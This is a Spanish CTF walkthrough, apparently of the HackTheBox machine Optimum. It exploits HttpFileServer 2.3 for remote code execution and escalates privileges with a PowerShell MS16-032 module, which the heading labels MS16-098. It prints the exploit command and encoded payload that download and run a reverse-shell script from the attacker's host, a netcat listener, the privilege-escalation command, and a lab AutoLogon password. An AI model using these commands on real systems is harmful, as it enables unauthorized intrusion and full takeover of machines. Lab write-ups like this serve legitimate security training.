--------
- Tags: #sherlock #httpfileserver #winpeas 
- ---------
## Técnicas utilizadas
- HttpFileServer 2.3 Exploitation [RCE]  
- System Recognition - Windows Exploit Suggester  
- Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098) [Privilege Escalation]
## Procedimiento
![[Pasted image 20230823224124.png]]

#### Reconomiento
Al lanzar un **nmap** sobre la maquina, podemos ver los siguientes puertos con sus respectivas versiones y servicios:
```ruby
# nmap -sCV -p80 10.10.10.8
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-26 21:02 PDT
Nmap scan report for 10.10.10.8
Host is up (0.061s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
```

Un escaneo con **whatweb** sobre las tecnologías web, nos muestra lo siguientes:
```ruby
# whatweb 10.10.10.8
http://10.10.10.8 [200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
```

#### HttpFileServer 2.3 Exploitation [RCE]  
Al visitar la pagina, vemos trata de un **HttpFileServer** de version **2.3**. Buscando por exploits en **SearchSploit** encontramos un de tipo **Remote Code Execution**:
![[Pasted image 20230826210804.png]]

Usaremos el repositorio de [**Nishag**](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) para tener una powershell en la maquina victima. Ejecutamos el siguiente comando que nos indica dentro de los comentarios del script:
```ruby
# python3 exploit.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/ps.ps1')"
http://10.10.10.8:80/?search=%00{.+exec|c%3A%5Cwindows%5CSysNative%5CWindowsPowershell%5Cv1.0%5Cpowershell.exe%20IEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%27http%3A//10.10.14.2/ps.ps1%27%29.}
```

Y por otro lado ganamos la **Shell**:
```powershell
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.8] 49162
Windows PowerShell running as user kostas on OPTIMUM
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\kostas\Desktop>
```

#### System Recognition - Windows Exploit Suggester  
Una vez dentro, podemos proceder a subir **WinPeas** y este nos muestra las siguientes credenciales:
```
[+] Looking for AutoLogon credentials Some AutoLogon credentials were found!! 
DefaultUserName : kostas
DefaultPassword : kdeEjDowkS*
```

Pero no sirven para completamente nada.

#### Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow (MS16-098) [Privilege Escalation]
Podemos tirar de otras herramientas de reconomiento, como **sherlock.ps1** y esta nos muestra cosas mas interesantes:
```i
image
```

Podemos abusar de **MS16-098**, para esto, usaremos un modulo de PowerShell que se encuentra en el siguiente [enlace](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1). Solo tenemos que importarlo y ejecutar el comando que deciemos de manera privilegiada, en este caso, aprovechando que tenemos el invoke-powershell.ps1 lanzaremos otra shell como **Administrador**:
```powershell
PS> Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.2/ps.ps1')"
```

Y ya podriamos leer la flag de root:
![[Pasted image 20230826213653.png]]
